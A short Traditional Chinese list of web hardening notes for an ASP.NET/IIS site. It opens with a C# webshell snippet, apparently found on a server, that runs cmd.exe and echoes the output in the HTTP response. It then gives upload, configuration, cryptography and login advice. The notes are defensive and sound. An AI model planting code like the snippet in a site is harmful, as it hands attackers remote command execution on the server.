# 整埋

1. 源由 webshell
```cs
    var  p = new System.Diagnostics.Process();
    p.StartInfo.FileName = "cmd.exe";
    p.StartInfo.Arguments = @"/c dir"; 
    p.StartInfo.RedirectStandardOutput = true;
    p.StartInfo.RedirectStandardError = true;
    p.StartInfo.UseShellExecute = false;
    p.Start();

    var outp = p.StandardOutput.ReadToEnd() + p.StandardError.ReadToEnd();
    p.WaitForExit();
    context.Response.Write("HEPHMARKER:" + outp);
    context.Response.ContentType = "text/plain";
    context.Response.Write("Hello World");
```

2. 上傳檔案 **後端** 務必要檢查副檔案是否符合規範
3. 檔案盡量上傳到file service上，非不得以，才考慮本地路徑
4. 如果非不得以存在本地路徑，請專門為上傳檔案建立一個目錄，並於該目錄下放一個web.config,內容如下
```
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
    <system.webServer>
        <handlers accessPolicy="Read" />
    </system.webServer>
</configuration>
```

5. 資料庫連線抽離
```
<connectionStrings configSource="dc23aacf.ini" />
```

6. 注意DES加密已經很嚴重落伍，切勿用來保護重要資料

7. 非必要，請勿使用萬用登入，若不得以，請做好各項保全，例如限ip，日誌記錄，登入後通知(email)，凌晨時段不得登入

8. 後臺管理者登入，請評估重要性，需要的話，請做二因子登入驗證
